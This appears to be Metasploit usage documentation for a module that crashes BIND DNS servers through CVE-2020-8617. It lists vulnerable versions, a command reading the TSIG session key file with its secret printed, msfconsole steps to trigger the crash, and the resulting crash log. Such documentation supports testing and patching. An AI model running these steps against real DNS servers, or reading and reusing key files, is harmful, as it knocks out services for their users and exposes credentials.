## Vulnerable Application
The following versions of BIND.

- 9.0.0 -> 9.11.18
- 9.12.0 -> 9.12.4-P2
- 9.14.0 -> 9.14.11
- 9.16.0 -> 9.16.2
- 9.17.0 -> 9.17.1 of the 9.17 experimental development branch.
- All releases in the obsolete 9.13 and 9.15 development branches.
- All releases of BIND Supported Preview Edition from 9.9.3-S1 -> 9.11.18-S1.

The attacker must know the name of the real TSIGKey on the target in order to exploit CVE-2020-8617. However, by
default, BIND generates a TSIGKey that name of  "local-ddns" at boot time. As such, the majority of target versions are
vulnerable to this attack.

```
$ sudo cat /var/run/named/session.key
key "local-ddns" {
        algorithm hmac-sha256;
        secret "s/+GOoQRryn/VVndpmFHsgDOBLwndh1zEjVJLK5jo04=";
};

```

## Verification Steps
  1. Start the vulnerable server
  2. Start `msfconsole`
  3. Do: ```use auxiliary/dos/dns/bind_tsig_badtime```
  4. Do: ```run```
  5. The server should crash

## Options

## Scenarios

### Server output from crash

```
26-May-2020 02:45:59.565 general: critical: tsig.c:954: INSIST(msg->verified_sig) failed, back trace
26-May-2020 02:45:59.565 general: critical: #0 0x563435d6aa40 in __do_global_dtors_aux_fini_array_entry()+0x5634357f6888
26-May-2020 02:45:59.565 general: critical: #1 0x563435f49c0a in __do_global_dtors_aux_fini_array_entry()+0x5634359d5a52
26-May-2020 02:45:59.565 general: critical: #2 0x563435ecfcb9 in __do_global_dtors_aux_fini_array_entry()+0x56343595bb01
26-May-2020 02:45:59.565 general: critical: #3 0x563435e14b19 in __do_global_dtors_aux_fini_array_entry()+0x5634358a0961
26-May-2020 02:45:59.565 general: critical: #4 0x563435d5b57f in __do_global_dtors_aux_fini_array_entry()+0x5634357e73c7
26-May-2020 02:45:59.565 general: critical: #5 0x563435d5cffd in __do_global_dtors_aux_fini_array_entry()+0x5634357e8e45
26-May-2020 02:45:59.565 general: critical: #6 0x563435d5d6a8 in __do_global_dtors_aux_fini_array_entry()+0x5634357e94f0
26-May-2020 02:45:59.565 general: critical: #7 0x563435d5f1a7 in __do_global_dtors_aux_fini_array_entry()+0x5634357eafef
26-May-2020 02:45:59.565 general: critical: #8 0x563435f716d9 in __do_global_dtors_aux_fini_array_entry()+0x5634359fd521
26-May-2020 02:45:59.565 general: critical: #9 0x7f6513f576db in __do_global_dtors_aux_fini_array_entry()+0x7f65139e3523
26-May-2020 02:45:59.565 general: critical: #10 0x7f6513c8088f in __do_global_dtors_aux_fini_array_entry()+0x7f651370c6d7
26-May-2020 02:45:59.565 general: critical: exiting (due to assertion failure)
```

